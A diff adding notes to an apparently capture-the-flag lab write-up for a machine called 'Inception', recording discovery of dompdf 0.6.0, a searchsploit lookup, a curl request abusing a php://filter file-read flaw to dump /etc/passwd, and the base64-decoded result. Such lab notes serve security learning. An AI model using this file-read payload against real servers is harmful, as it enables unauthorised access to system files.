@@ -20,3 +20,23 @@ Inception
         Operating systems: Ubuntu
         
         http://10.10.10.67/assets/
+
+        In 'inspection mode' we found 'dompdf'
+
+        http://10.10.10.67/dompdf/:
+            We found some files and the version 0.6.0
+
+
+        searhsploit dompdf 0.6.0
+        searhsploit -x <exploitPath>
+
+
+        We will try to extract users in /etc/passwd:
+            curl http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd
+
+
+        We extract the users name in base64, LETS Decode:
+            echo <payload> -n | base64 -d 
+                cobb:x:1000:1000::/home/cobb:/bin/bash
+
+        
